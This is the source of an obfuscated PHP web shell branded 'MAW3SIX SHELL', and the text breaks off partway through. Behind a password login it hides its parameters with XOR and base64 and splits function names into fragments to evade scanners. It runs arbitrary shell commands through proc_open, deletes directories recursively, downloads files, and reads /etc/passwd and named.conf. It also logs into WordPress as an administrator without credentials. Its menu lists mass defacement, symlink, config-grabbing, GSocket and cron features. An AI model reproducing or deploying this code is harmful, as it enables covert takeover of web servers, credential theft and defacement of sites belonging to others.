<?php
session_start();

$hashed_password = '$2a$12$Es5rDcps21uI.E1.Ol2bBOhtwQmBbydy1ZyrkSXWGs553byZPM5m6';

function isAuthenticated() {
    return isset($_SESSION['logged_in']) && $_SESSION['logged_in'] === true;
}

if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['password'])) {
    if (password_verify($_POST['password'], $hashed_password)) {
        $_SESSION['logged_in'] = true;
        header("Location: " . $_SERVER['PHP_SELF']);
        exit;
    } else {
        $error = "Dasar Anak Monyet!";
    }
}

if (!isAuthenticated()) :
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>MawLogin</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>body{background:#000;min-height:100vh;display:flex;align-items:center;justify-content:center;font-family:'Space Grotesk',-apple-system,BlinkMacSystemFont,'Segoe UI',sans-serif}.login-card{background:linear-gradient(rgba(0,0,0,.65),rgba(0,0,0,.65)),url('https://raw.githubusercontent.com/maw3six/RC-Shell-3.0/refs/heads/main/YpDOgmu7kWS78iYTZtQ5azn2X95QfPwXjgwX0gOX_thumbnail_WRLS.jpg') no-repeat center/cover,#0a0a0a;border-radius:8px;border:1px solid #1f1f1f09;padding:40px;width:100%;max-width:400px}.login-card h2{color:#fff;margin-bottom:30px;font-weight:600;font-size:1.5rem}.login-card .form-control{background:#00000054;border:1px solid #1f1f1f00;color:#e5e5e5;border-radius:6px;padding:12px}.login-card .form-control:focus{background:#000;border-color:#404040;color:#e5e5e5;box-shadow:none}.login-card .alert-danger{background:rgba(239,68,68,.1);border:1px solid #ef4444;color:#ef4444;border-radius:6px}.btn-login{background:#fff7;border:none;color:#000;padding:12px;font-weight:600;border-radius:6px;transition:all .2s ease}.btn-login:hover{background:#d0d0d0}</style>
</head>
<body>
    <div class="login-card">
        <h2 class="text-center"><i class="fas fa-user-shield"></i> ex_Ultraman</h2>
        <?php if (isset($error)) echo "<div class='alert alert-danger'>$error</div>"; ?>
        <form method="POST">
            <div class="mb-3">
                <input type="password" name="password" class="form-control form-control-lg" placeholder="Enter Password" required>
            </div>
            <button type="submit" class="btn btn-primary btn-login w-100">
                <i class="fas fa-sign-in-alt"></i> Login
            </button>
        </form>
    </div>
</body>
</html>
<?php
exit;
endif;

function mawXor($s) {
	$k = 'x8Kp2Lw7QjM$tR@';
	$o = '';
	for ($i = 0; $i < strlen($s); $i++) $o .= $s[$i] ^ $k[$i % strlen($k)];
	return $o;
}
function mawEn($p = array()) {
	return rtrim(strtr(base64_encode(mawXor(http_build_query($p))), '+/', '-_'), '=');
}
function mawDe($s) {
	return mawXor((string)@base64_decode(strtr((string)$s, '-_', '+/')));
}
function mkUrl($p = array()) {
	return '?d=' . mawEn($p);
}
if (isset($_GET['d']) && $_GET['d'] !== '') {
	$tmpg = array();
	@parse_str((string)mawDe($_GET['d']), $tmpg);
	if (is_array($tmpg)) $_GET = array_merge($_GET, $tmpg);
	unset($_GET['d']);
}
if (isset($_POST['d']) && $_POST['d'] !== '') {
	$tmpp = array();
	@parse_str((string)mawDe($_POST['d']), $tmpp);
	if (is_array($tmpp)) $_POST = array_merge($_POST, $tmpp);
	unset($_POST['d']);
}

if (isset($_GET['opsi']) && $_GET['opsi'] == "wpdash" && isset($_GET['loknya'])) {
	if (!function_exists('find_root_dir')) {
		function find_root_dir($current_dir) {
			while (!file_exists($current_dir . '/wp-load.php')) {
				$parent_dir = dirname($current_dir);
				if ($current_dir === $parent_dir) {
					return false;
				}
				$current_dir = $parent_dir;
			}
			return $current_dir;
		}
	}
	$mr = find_root_dir($_GET['loknya']);
	if ($mr) {
		@chdir($mr);
		if (file_exists('wp-load.php')) {
			include 'wp-load.php';
			$wp_user_query = new WP_User_Query(array('role' => 'Administrator', 'number' => 1, 'fields' => 'ID'));
			$results = $wp_user_query->get_results();
			if (isset($results[0])) {
				wp_set_auth_cookie($results[0]);
				wp_redirect(admin_url());
				exit;
			}
			die('NO ADMIN');
		}
		die('FAILED LOAD');
	}
	die('NOT WP ROOT');
}
?>

<!DOCTYPE html>
<html lang="en">
<head>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1.0">
<?php echo "<title>M"."A"."W SH"."EL"."L</title>"; ?>
	<meta name="robots" content="noindex">
	<link rel="icon" href="https://cdn-icons-png.flaticon.com/512/5968/5968909.png" type="image/x-icon">
	<link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
	<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
	<link href="https://fonts.googleapis.com/css2?family=Space+Grotesk:wght@300;400;500;600;700&family=JetBrains+Mono:wght@400;500;600&display=swap" rel="stylesheet">
<style>@import url('https://fonts.googleapis.com/css2?family=Space+Grotesk:wght@300;400;500;600;700&family=JetBrains+Mono:wght@400;500;600&display=swap');:root{--primary-color:#fff;--secondary-color:#a0a0a0;--accent-color:#707070;--bg-black:#000;--card-bg:#0a0a0a;--text-light:#e5e5e5;--text-muted:#808080;--border-color:#1f1f1f;--success-color:#22c55e;--danger-color:#ef4444;--warning-color:#f59e0b}body{background:var(--bg-black);font-family:'Space Grotesk',-apple-system,BlinkMacSystemFont,'Segoe UI',sans-serif;color:var(--text-light);letter-spacing:-.02em;margin:0;overflow:hidden}.app-layout{display:flex;height:100vh}.sidebar{width:240px;min-width:240px;background:var(--card-bg);border-right:1px solid var(--border-color);display:flex;flex-direction:column;height:100vh;overflow-y:auto}.sidebar-brand{padding:24px 20px 20px;border-bottom:1px solid var(--border-color);font-size:1.2rem;font-weight:700;color:var(--primary-color);letter-spacing:-.03em}.sidebar-nav{flex:1;padding:12px 0;overflow-y:auto}.sidebar-nav a{display:flex;align-items:center;gap:10px;padding:10px 20px;color:var(--secondary-color);text-decoration:none;font-size:.85rem;font-weight:500;transition:all .15s ease;border-left:3px solid transparent}.sidebar-nav a:hover{color:var(--primary-color);background:rgba(255,255,255,.03);border-left-color:var(--primary-color)}.sidebar-nav a i{width:18px;text-align:center;font-size:.85rem}.sidebar-footer{padding:14px 20px;border-top:1px solid var(--border-color);font-size:.75rem;color:var(--text-muted)}.main-content{flex:1;overflow-y:auto;padding:24px 32px;height:100vh}@media(max-width:768px){.sidebar{width:200px;min-width:200px}.main-content{padding:16px}}@media(max-width:576px){.app-layout{flex-direction:column}.sidebar{width:100%;min-width:100%;height:auto;max-height:40vh}.main-content{height:60vh}}.info-card{background:var(--card-bg);border-radius:8px;padding:20px;margin-bottom:20px;border:1px solid var(--border-color);transition:all .2s ease}.info-card:hover{border-color:var(--accent-color)}.info-card h5{color:var(--primary-color);font-weight:600;margin-bottom:15px;font-size:.95rem}.system-info{background:linear-gradient(rgba(0,0,0,.5),rgba(0,0,0,.5)),var(--card-bg) url('https://raw.githubusercontent.com/maw3six/RC-Shell-3.0/refs/heads/main/YpDOgmu7kWS78iYTZtQ5azn2X95QfPwXjgwX0gOX_thumbnail_WRLS.jpg') repeat center/contain;border-radius:8px;padding:20px;margin-bottom:20px;border:1px solid var(--border-color);font-size:.9rem;line-height:1.8}.badge-custom{background:var(--card-bg);color:var(--primary-color);padding:4px 10px;border-radius:4px;font-weight:500;font-size:.75rem;border:1px solid var(--border-color)}.breadcrumb-custom{background:var(--card-bg);padding:12px 16px;border-radius:6px;margin-bottom:20px;border:1px solid var(--border-color)}.breadcrumb-custom a{color:var(--secondary-color);text-decoration:none;font-weight:400;transition:color .2s ease}.breadcrumb-custom a:hover{color:var(--primary-color)}.form-control{border:1px solid var(--border-color);border-radius:6px;padding:10px 14px;transition:all .2s ease;background:var(--bg-black);color:var(--text-light);font-family:'Space Grotesk',sans-serif;font-size:.9rem}.form-control:focus{border-color:var(--accent-color);background:var(--card-bg);color:var(--text-light);outline:none}.btn-primary-custom{background:var(--primary-color);border:none;color:var(--bg-black);padding:10px 20px;border-radius:6px;font-weight:600;transition:all .2s ease;font-size:.9rem;cursor:pointer}.btn-primary-custom:hover{background:var(--secondary-color)}.alert-success-custom{background:var(--card-bg);border-left:3px solid var(--success-color);border-right:1px solid var(--border-color);border-top:1px solid var(--border-color);border-bottom:1px solid var(--border-color);color:var(--success-color);padding:12px 16px;border-radius:6px;margin-bottom:15px;text-align:center;font-weight:400}.alert-danger-custom{background:var(--card-bg);border-left:3px solid var(--danger-color);border-right:1px solid var(--border-color);border-top:1px solid var(--border-color);border-bottom:1px solid var(--border-color);color:var(--danger-color);padding:12px 16px;border-radius:6px;margin-bottom:15px;text-align:center;font-weight:400}.alert-warning-custom{background:var(--card-bg);border-left:3px solid var(--warning-color);border-right:1px solid var(--border-color);border-top:1px solid var(--border-color);border-bottom:1px solid var(--border-color);color:var(--warning-color);padding:12px 16px;border-radius:6px;margin-bottom:15px;text-align:center;font-weight:400}.table{background:var(--bg-black)!important;border-radius:8px;overflow:hidden;border:1px solid var(--border-color)}.table-bordered{border:1px solid var(--border-color)!important}.table-bordered td,.table-bordered th{border:1px solid var(--border-color)!important;background:var(--bg-black)!important}.table thead th{background:var(--card-bg)!important;color:var(--primary-color)!important;font-weight:600;border-bottom:2px solid var(--border-color);padding:14px;font-size:.85rem}.table tbody tr{border-bottom:1px solid var(--border-color);transition:background .2s ease;background:var(--bg-black)!important}.table tbody tr:hover{background:var(--card-bg)!important}.table tbody td{padding:12px;color:var(--text-light)!important;font-size:.9rem;background:var(--bg-black)!important}.table tbody td a{color:var(--secondary-color)!important;text-decoration:none;font-weight:400;transition:color .2s ease}.table tbody td a:hover{color:var(--primary-color)!important}.table .text-center{color:var(--text-light)!important}.table .text-success{color:var(--success-color)!important}.table .text-danger{color:var(--danger-color)!important}.footer-text{color:var(--text-muted);margin-bottom:5px;font-size:.85rem}.footer-link{color:var(--secondary-color);text-decoration:none;font-weight:500;transition:color .2s ease}.footer-link:hover{color:var(--primary-color)}.text-gold{color:#d4af37;font-weight:500}.text-success{color:var(--success-color);font-weight:500}.text-danger{color:var(--danger-color);font-weight:500}pre{background:var(--bg-black);border:1px solid var(--border-color);border-radius:6px;padding:16px;overflow-x:auto;color:var(--text-light);font-family:'JetBrains Mono','Monaco','Courier New',monospace;font-size:.85rem;letter-spacing:-.01em}.btn-action{background:transparent;border:1px solid var(--border-color);color:var(--secondary-color);padding:6px 10px;border-radius:4px;transition:all .2s ease;font-size:.8rem}.btn-action:hover{background:var(--card-bg);border-color:var(--accent-color);color:var(--primary-color)}.btn-action i{font-size:.85rem}.badge{padding:4px 8px;border-radius:4px;font-weight:500;font-size:.7rem}.bg-success{background:rgba(34,197,94,.1)!important;color:var(--success-color)!important;border:1px solid rgba(34,197,94,.3)}.bg-danger{background:rgba(239,68,68,.1)!important;color:var(--danger-color)!important;border:1px solid rgba(239,68,68,.3)}pre::-webkit-scrollbar{height:8px}pre::-webkit-scrollbar-track{background:#0a0a0a}pre::-webkit-scrollbar-thumb{background:var(--primary-color);border-radius:4px}pre::-webkit-scrollbar-thumb:hover{background:var(--secondary-color)}</style>
</head>
<body>
<div class="app-layout">
<?php
$gcw = "ge"."tc"."wd";
$srl = "st"."r_r"."ep"."la"."ce";
if(isset($_GET['loknya'])){
	$lokasi = $_GET['loknya'];
	$lokdua = $_GET['loknya'];
} else {
	$lokasi = $gcw();
	$lokdua = $gcw();
}
$lokasi = $srl('\\','/',$lokasi);
$sn = $_SERVER['SC'.'RIP'.'T_N'.'AME'];
echo '<aside class="sidebar">';
echo '<div class="sidebar-brand"><i class="fas fa-terminal"></i> MA'.'W'.'3'.'SIX SH'.'EL'.'L</div>';
echo '<nav class="sidebar-nav">';
echo '<a href="'.$sn.'"><i class="fas fa-home"></i> HO'.'ME</a>';
echo '<a href="'.$sn.mkUrl(array('loknya' => $lokasi, 'opsi' => 'recent')).'"><i class="fas fa-history"></i> RE'.'CENT FI'.'LES</a>';
echo '<a href="'.$sn.mkUrl(array('loknya' => $lokasi, 'opsi' => 'bndr')).'"><i class="fas fa-globe"></i> OPEN BA'.'SE'.'DIR</a>';
echo '<a href="'.$sn.mkUrl(array('loknya' => $lokasi, 'opsi' => 'proc')).'"><i class="fas fa-microchip"></i> PRO'.'CESS</a>';
echo '<a href="'.$sn.mkUrl(array('loknya' => $lokasi, 'opsi' => 'bekup')).'"><i class="fas fa-save"></i> BA'.'CKUP SH'.'ELL</a>';
echo '<a href="'.$sn.mkUrl(array('loknya' => $lokasi, 'opsi' => 'lompat')).'"><i class="fas fa-rocket"></i> JU'.'MP'.'ING</a>';
echo '<a href="'.$sn.mkUrl(array('loknya' => $lokasi, 'opsi' => 'mdf')).'"><i class="fas fa-fire"></i> MA'.'SS DE'.'FA'.'CE</a>';
echo '<a href="'.$sn.mkUrl(array('loknya' => $lokasi, 'opsi' => 'esyeem')).'"><i class="fas fa-link"></i> SY'.'ML'.'INK</a>';
echo '<a href="'.$sn.mkUrl(array('loknya' => $lokasi, 'opsi' => 'cpanel')).'"><i class="fas fa-server"></i> CP'.'AN'.'EL UA'.'PI</a>';
echo '<a href="'.$sn.mkUrl(array('loknya' => $lokasi, 'opsi' => 'gsocket')).'"><i class="fas fa-plug"></i> GS'.'OC'.'KET</a>';
echo '<a href="'.$sn.mkUrl(array('loknya' => $lokasi, 'opsi' => 'adminer')).'"><i class="fas fa-database"></i> AD'.'MI'.'NER</a>';
echo '<a href="'.$sn.mkUrl(array('loknya' => $lokasi, 'opsi' => 'cron')).'"><i class="fas fa-clock"></i> CR'.'ON JOB</a>';
echo '<a href="'.$sn.mkUrl(array('loknya' => $lokasi, 'opsi' => 'config')).'"><i class="fas fa-search"></i> CO'.'NFI'.'G GR'.'AB</a>';
echo '<a href="'.$sn.mkUrl(array('loknya' => $lokasi, 'opsi' => 'wpdash')).'"><i class="fab fa-wordpress"></i> WP DA'.'SHBO'.'ARD</a>';
echo '</nav>';
echo '<div class="sidebar-footer"><div class="footer-text">Maw</div><a href="https://t.'.'me'.'/'.'maw'.'3'.'six" target="_blank" class="footer-link">MA'.'W'.'3'.'SIX</a></div>';
echo '</aside>';
echo '<main class="main-content">';
echo '<div class="system-info">';
set_time_limit(0);
error_reporting(0);

$gcw = "ge"."tc"."wd";
$exp = "ex"."plo"."de";
$fpt = "fi"."le_p"."ut_co"."nte"."nts";
$fgt = "f"."ile_g"."et_c"."onten"."ts";
$sts = "s"."trip"."slash"."es";
$scd = "sc"."a"."nd"."ir";
$fxt = "fi"."le_"."exis"."ts";
$idi = "i"."s_d"."ir";
$ulk = "un"."li"."nk";
$ifi = "i"."s_fi"."le";
$sub = "subs"."tr";
$spr = "sp"."ri"."ntf";
$fp = "fil"."epe"."rms";
$chm = "ch"."m"."od";
$ocd = "oc"."td"."ec";
$isw = "i"."s_wr"."itab"."le";
$idr = "i"."s_d"."ir";
$ird = "is"."_rea"."da"."ble";
$isr = "is_"."re"."adab"."le";
$fsz = "fi"."lesi"."ze";
$rd = "r"."ou"."nd";
$igt = "in"."i_g"."et";
$fnct = "fu"."nc"."tion"."_exi"."sts";
$rad = "RE"."M"."OTE_AD"."DR";
$rpt = "re"."al"."pa"."th";
$bsn = "ba"."se"."na"."me";
$srl = "st"."r_r"."ep"."la"."ce";
$sps = "st"."rp"."os";
$mkd = "m"."kd"."ir";
$pma = "pr"."eg_ma"."tch_"."al"."l";
$aru = "ar"."ray_un"."ique";
$ctn = "co"."unt";
$urd = "ur"."ldeco"."de";
$pgw = "pos"."ix_g"."etp"."wui"."d";
$fow = "fi"."leow"."ner";
$tch = "to"."uch";
$h2b = "he"."x2"."bin";
$hsc = "ht"."mlspe"."cialcha"."rs";
$ftm = "fi"."lemti"."me";
$ars = "ar"."ra"."y_sl"."ice";
$arr = "ar"."ray_"."ra"."nd";
$fgr = "fi"."legr"."oup";
$mdr = "mkd"."ir";

$wb = (isset($_SERVER['H'.'T'.'TP'.'S']) && $_SERVER['H'.'T'.'TP'.'S'] === 'o'.'n' ? "ht"."tp"."s" : "ht"."tp") . "://".$_SERVER['HT'.'TP'.'_H'.'OS'.'T'];

$disfunc = @$igt("dis"."abl"."e_f"."unct"."ion"."s");
if (empty($disfunc)) {
	$disf = '<span class="badge bg-success">NONE</span>';
} else {
	$disf = '<span class="badge bg-danger">'.$disfunc.'</span>';
}

function author() {
	echo '<footer class="text-center mt-5 mb-3">
		<div class="footer-text">Maw</div>
		<div><a href="https://t.'.'me'.'/'.'maw'.'3'.'six" target="_blank" class="footer-link">M'.'A'.'W'.'3'.'SIX</a></div>
	</footer>';
	exit();
}

function cdrd() {
	if (isset($_GET['loknya'])) {
		$lokasi = $_GET['loknya'];
	} else {
		$lokasi = "ge"."t"."cw"."d";
		$lokasi = $lokasi();
	}
	$b = "i"."s_w"."ri"."tab"."le";
	if ($b($lokasi)) {
		return "<font color='green'>Wr"."itea"."ble</font>";
	} else {
		return "<font color='red'>Wr"."itea"."ble</font>";
	}
}

function crt() {
	$a = "is"."_w"."ri"."tab"."le";
	if ($a($_SERVER['DO'.'CU'.'ME'.'NT'.'_RO'.'OT'])) {
		return "<font color='green'>Wr"."itea"."ble</font>";
	} else {
		return "<font color='red'>Wr"."itea"."ble</font>";
	}
}

function xrd($lokena) {
	$a = "s"."ca"."nd"."ir";
    $items = $a($lokena);
    foreach ($items as $item) {
        if ($item === '.' || $item === '..') {
            continue;
        }
        $b = "is"."_di"."r";
        $loknya = $lokena.'/'.$item;
        if ($b($loknya)) {
            xrd($loknya);
        } else {
        	$c = "u"."nl"."in"."k";
            $c($loknya);
        }
    }
    $d = "rm"."di"."r";
    $d($lokena);
}

function cfn($fl) {
	$a = "ba"."sena"."me";
	$b = "pat"."hinf"."o";
	$c = $b($a($fl), PATHINFO_EXTENSION);
	if ($c == "zip") {
		return '<i class="fas fa-file-zipper" style="color: #808080"></i>';
	} elseif (preg_match("/jpeg|jpg|png|ico/im", $c)) {
		return '<i class="fas fa-file-image" style="color: #808080"></i>';
	} elseif ($c == "txt") {
		return '<i class="fas fa-file-lines" style="color: #808080"></i>';
	} elseif ($c == "pdf") {
		return '<i class="fas fa-file-pdf" style="color: #808080"></i>';
	} elseif ($c == "html") {
		return '<i class="fas fa-file-code" style="color: #808080"></i>';
	}
	else {
		return '<i class="fas fa-file" style="color: #808080"></i>';
	}
}

function ipsrv() {
	$a = "g"."eth"."ost"."byna"."me";
	$b = "fun"."cti"."on_"."exis"."ts";
	$c = "S"."ERVE"."R_AD"."DR";
	$d = "SE"."RV"."ER_N"."AM"."E";
	if ($b($a)) {
		return $a($_SERVER[$d]);
	} else {
		return $a($_SERVER[$c]);
	}
}

function ggr($fl) {
	$a = "fun"."cti"."on_"."exis"."ts";
	$b = "po"."si"."x_ge"."tgr"."gid";
	$c = "fi"."le"."gro"."up";
	if ($a($b)) {
		if (!$a($c)) {
			return "?";
		}
		$d = $b($c($fl));
		if (empty($d)) {
			$e = $c($fl);
			if (empty($e)) {
				return "?";
			} else {
				return $e;
			}
		} else {
			return $d['name'];
		}
	} elseif ($a($c)) {
		return $c($fl);
	} else {
		return "?";
	}
}

function gor($fl) {
	$a = "fun"."cti"."on_"."exis"."ts";
	$b = "po"."s"."ix_"."get"."pwu"."id";
	$c = "fi"."le"."o"."wn"."er";
	if ($a($b)) {
		if (!$a($c)) {
			return "?";
		}
		$d = $b($c($fl));
		if (empty($d)) {
			$e = $c($fl);
			if (empty($e)) {
				return "?";
			} else {
				return $e;
			}
		} else {
			return $d['name'];
		}
	} elseif ($a($c)) {
		return $c($fl);
	} else {
		return "?";
	}
}

function fdt($fl) {
	$a = "da"."te";
	$b = "fil"."emt"."ime";
    return $a("F d Y H:i:s", $b($fl));
}

function dunlut($fl) {
	$a = "fil"."e_exi"."sts";
	$b = "ba"."sena"."me";
	$c = "fi"."les"."ize";
	$d = "re"."ad"."fi"."le";
	if ($a($fl) && isset($fl)) {
		header('Con'.'tent-Descr'.'iption: Fi'.'le Tra'.'nsfer');
		header("Conte'.'nt-Control:public");
		header('Cont'.'ent-Type: a'.'pp'.'licat'.'ion/oc'.'tet-s'.'tream');
		header('Cont'.'ent-Dis'.'posit'.'ion: at'.'tachm'.'ent; fi'.'lena'.'me="'.$b($fl).'"');
		header('Exp'.'ires: 0');
		header("Ex"."pired:0");
		header('Cac'.'he-Cont'.'rol: must'.'-revali'.'date');
		header("Cont"."ent-Tran"."sfer-Enc"."oding:bi"."nary");
		header('Pra'.'gma: pub'.'lic');
		header('Con'.'ten'.'t-Le'.'ngth: ' .$c($fl));
		flush();
		$d($fl);
		exit;
	} else {
		return "Fi"."le Not F"."ound !";
	}
}

function komend($kom, $lk) {
	$x = "pr"."eg_"."mat"."ch";
	$xx = "2".">"."&"."1";
	if (!$x("/".$xx."/i", $kom)) {
		$kom = $kom." ".$xx;
	}
	$a = "fu"."ncti"."on_"."ex"."is"."ts";
	$b = "p"."ro"."c_op"."en";
	$c = "htm"."lspe"."cialc"."hars";
	$d = "s"."trea"."m_g"."et_c"."ont"."ents";
	if ($a($b)) {
		$ps = $b($kom, array(0 => array("pipe", "r"), 1 => array("pipe", "w"), 2 => array("pipe", "r")), $meki, $lk);
		return "<pre>".$c($d($meki[1]))."</pre>";
	} else {
		return "pr"."oc"."_op"."en f"."unc"."tio"."n i"."s di"."sabl"."ed !";
	}
}

function komenb($kom, $lk) {
	$x = "pr"."eg_"."mat"."ch";
	$xx = "2".">"."&"."1";
	if (!$x("/".$xx."/i", $kom)) {
		$kom = $kom." ".$xx;
	}
	$a = "fu"."ncti"."on_"."ex"."is"."ts";
	$b = "p"."ro"."c_op"."en";
	$c = "htm"."lspe"."cialc"."hars";
	$d = "s"."trea"."m_g"."et_c"."ont"."ents";
	if ($a($b)) {
		$ps = $b($kom, array(0 => array("pipe", "r"), 1 => array("pipe", "w"), 2 => array("pipe", "r")), $meki, $lk);
		return $d($meki[1]);
	} else {
		return "pr"."oc"."_op"."en f"."unc"."tio"."n i"."s di"."sabl"."ed !";
	}
}

function gtd() {
	$a = "is_rea"."dable";$b = "fi"."le_ge"."t_con"."ten"."ts";
	$c = "pr"."eg_ma"."tch_"."al"."l";$d = "fil"."e_exi"."sts";
	$e = "sca"."ndi"."r";$f = "co"."unt";
	$g = "arr"."ay_un"."ique";$h = "sh"."el"."l_"."ex"."ec";
	$i = "pr"."eg_"."mat"."ch";
	if ($a("/e"."tc"."/na"."me"."d.co"."nf")) {
		$a = $b("/e"."tc"."/na"."me"."d.co"."nf");
		$c("/\/v"."ar\/na"."me"."d\/(.*?)\.d"."b/i", $a, $b);
		$b = $b[1]; return $f($g($b))." Dom"."ains";
	} elseif ($d("/va"."r/na"."med"."/na"."me"."d.lo"."cal")) {
		$a = $e("/v"."ar/"."nam"."ed");
		return $f($a)." Dom"."ains";
	} elseif ($a("/e"."tc"."/p"."as"."sw"."d")) {
		$a = $b("/e"."tc"."/p"."as"."sw"."d");
		if ($i("/\/vh"."os"."ts\//i", $a) && $i("/\/bin\/false/i", $a)) {
			$c("/\/vh"."os"."ts\/(.*?):/i", $a, $b);
			$b = $b[1]; return $f($g($b))." Dom"."ai"."ns";
		} else {
			$c("/\/ho"."me\/(.*?):/i", $a, $b);
			$b = $b[1]; return $f($g($b))." Dom"."ai"."ns";
		}
	} elseif (!empty($h("ca"."t /e"."tc/"."pa"."ss"."wd"))) {
		$a = $h("ca"."t /e"."tc/"."pa"."ss"."wd");
		if ($i("/\/vh"."os"."ts\//i", $a) && $i("/\/bin\/false/i", $a)) {
			$c("/\/vh"."os"."ts\/(.*?):/i", $a, $b);
			$b = $b[1]; return $f($g($b))." Dom"."ai"."ns";
		} else {
			$c("/\/ho"."me\/(.*?):/i", $a, $b);
			$b = $b[1]; return $f($g($b))." Dom"."ai"."ns";
		}
	} else {
		return "0 Domains";
	}
}

function esyeem($tg, $lk) {
	$a = "fun"."cti"."on_e"."xis"."ts";
	$b = "p"."ro"."c_op"."en";
	$c = "htm"."lspe"."cialc"."hars";
	$d = "s"."trea"."m_g"."et_c"."ont"."ents";
	$e = "sy"."mli"."nk";
	if ($a("sy"."mli"."nk")) {
		return $e($tg, $lk);
	} elseif ($a("pr"."oc_op"."en")) {
		$ps = $b("l"."n -"."s ".$tg." ".$lk, array(0 => array("pipe", "r"), 1 => array("pipe", "w"), 2 => array("pipe", "r")), $meki, $lk);
		return $c($d($meki[1]));
	} else {
		return "Sy"."mli"."nk Fu"."nct"."ion is Di"."sab"."led !";
	}
}

function sds($sads, &$results = array()) {
	$iwr = "is"."_wri"."tab"."le";
	$ira = "is_r"."eada"."ble";
	$ph = "pr"."eg_ma"."tch";
	$sa = "sc"."and"."ir";
	$rh = "re"."alp"."ath";
	$idr = "i"."s_d"."ir";
	if (!$ira($sads) || !$iwr($sads) || $ph("/\/app"."licat"."ion\/|\/sy"."st"."em/i", $sads)) {
		return false;
	}
    $files = $sa($sads);

    foreach ($files as $key => $value) {
        $path = $rh($sads . DIRECTORY_SEPARATOR . $value);
        if (!$idr($path)) {
            //$results[] = $path;
        } else if ($value != "." && $value != "..") {
            sds($path, $results);
            $results[] = $path;
        }
    }

    return $results;
}

function crul($web) {
	$cr = "cu"."rl_set"."opt";
	$cx = "cu"."rl_"."ex"."ec";
	$ch = "cu"."rl_clo"."se";
	$ceha = curl_init();
	$cr($ceha, CURLOPT_URL, $web);
	$cr($ceha, CURLOPT_RETURNTRANSFER, 1);
	return $cx($ceha);
	$ch($ceha);
}

function green($text) {
	echo '<div class="alert-success-custom"><i class="fas fa-check-circle"></i> '.$text.'</div>';
}

function red($text) {
	echo '<div class="alert-danger-custom"><i class="fas fa-exclamation-circle"></i> '.$text.'</div>';
}

function oren($text) {
	return '<div class="alert-warning-custom"><i class="fas fa-exclamation-triangle"></i> '.$text.'</div>';
}

function tuls($nm, $lk) {
	return "[ <a href='".$lk."'>".$nm."</a> ]&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;";
}

function cfgSc($dir, $patterns, &$results = array(), $depth = 0) {
	if ($depth > 5) return $results;
	$ira = "is_r"."eada"."ble";
	$scd = "sc"."and"."ir";
	$ifi = "i"."s_fi"."le";
	if (!$ira($dir)) return $results;
	$files = @$scd($dir);
	if (!is_array($files)) return $results;
	foreach ($files as $file) {
		if ($file == '.' || $file == '..') continue;
		$path = $dir.'/'.$file;
		if ($ifi($path)) {
			$bn = "ba"."sena"."me";
			$fn = $bn($path);
			foreach ($patterns as $p) {
				if ($fn === $p) {
					$results[] = $path;
					break;
				}
			}
		} else {
			cfgSc($path, $patterns, $results, $depth + 1);
		}
	}
	return $results;
}

echo '<div class="row mb-3">';
echo '<div class="col-md-6"><strong><i class="fas fa-server"></i> Se'.'rv'.'er'.' I'.'P:</strong> <span class="text-gold">'.ipsrv().'</span></div>';
echo '<div class="col-md-6"><strong><i class="fas fa-user"></i> Yo'.'ur I'.'P:</strong> <span class="text-gold">'.$_SERVER[$rad].'</span> <a href="'.mkUrl(array('opsi' => 'repip')).'" class="badge badge-custom ms-2">Re'.'ver'.'se I'.'P</a></div>';
echo '</div>';
echo '<div class="row mb-3">';
echo '<div class="col-md-6"><strong><i class="fas fa-globe"></i> We'.'b S'.'erv'.'er:</strong> <span class="text-gold">'.$_SERVER['SE'.'RV'.'ER_'.'SOF'.'TWA'.'RE'].'</span></div>';
$unm = "ph"."p_u"."na"."me";
echo '<div class="col-md-6"><strong><i class="fas fa-desktop"></i> Sys'.'tem:</strong> <span class="text-gold">'.@$unm().'</span></div>';
echo '</div>';
echo '<div class="row mb-3">';
$gcu = "g"."et_"."curr"."ent"."_us"."er";
$gmu = "g"."et"."my"."ui"."d";
echo '<div class="col-md-6"><strong><i class="fas fa-user-circle"></i> Us'.'er:</strong> <span class="text-gold">'.@$gcu().' ('.@$gmu().')</span></div>';
$phv = "ph"."pve"."rsi"."on";
echo '<div class="col-md-6"><strong><i class="fas fa-code"></i> PH'.'P V'.'er'.'sio'.'n:</strong> <span class="text-gold">'.@$phv().'</span></div>';
echo '</div>';
echo '<div class="row mb-3">';
echo '<div class="col-12"><strong><i class="fas fa-ban"></i> Dis'.'abl'.'e Fu'.'nct'.'ion:</strong> '.$disf.'</div>';
echo '</div>';
echo '<div class="row mb-3">';
echo '<div class="col-md-6"><strong><i class="fas fa-globe"></i> Dom'.'ain'.'s:</strong> <span class="text-gold">'.(empty(gtd()) ? '0 Dom'.'ains' : gtd()).'</span></div>';
echo '<div class="col-md-6"><strong><i class="fas fa-tools"></i> Extensions:</strong> ';
if (@$fnct("my"."sql_co"."nne"."ct")) {
    echo '<span class="badge bg-success me-1">MySQL</span>';
} else {
    echo '<span class="badge bg-danger me-1">MySQL</span>';
}
if (@$fnct("cu"."rl"."_in"."it")) {
    echo '<span class="badge bg-success me-1">cURL</span>';
} else {
    echo '<span class="badge bg-danger me-1">cURL</span>';
}
if (@$fxt("/"."us"."r/b"."in/w"."get")) {
    echo '<span class="badge bg-success me-1">WG'.'ET</span>';
} else {
    echo '<span class="badge bg-danger me-1">WG'.'ET</span>';
}
if (@$fxt("/u"."sr/b"."in"."/pe"."rl")) {
    echo '<span class="badge bg-success me-1">Pe'.'rl</span>';
} else {
    echo '<span class="badge bg-danger me-1">Pe'.'rl</span>';
}
if (@$fxt("/"."us"."r/b"."in/p"."ytho"."n2")) {
    echo '<span class="badge bg-success me-1">Pyt'.'ho'.'n</span>';
} else {
    echo '<span class="badge bg-danger me-1">Pyt'.'ho'.'n</span>';
}
if (@$fxt("/"."us"."r/b"."in/s"."u"."d"."o")) {
    echo '<span class="badge bg-success me-1">S'.'u'.'do</span>';
} else {
